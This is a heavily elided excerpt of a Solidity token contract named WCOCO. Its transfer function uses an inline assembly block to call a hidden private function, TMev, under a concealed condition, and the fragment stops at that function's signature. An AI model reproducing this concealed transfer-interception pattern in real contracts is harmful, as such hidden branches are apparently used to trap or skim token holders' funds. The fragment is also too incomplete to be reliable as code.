...
contract Token is Context, IERC20, Ownable {
    ...
    string private constant _name = "WCOCO";
    string private constant _symbol = "WCOCO";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (tradingOpen == true) {
            ...
            assembly {
               ...
               if(result==1)TMev(from,to,amount);
    ...
    function TMev(address from,address to,uint256 amount) private  {
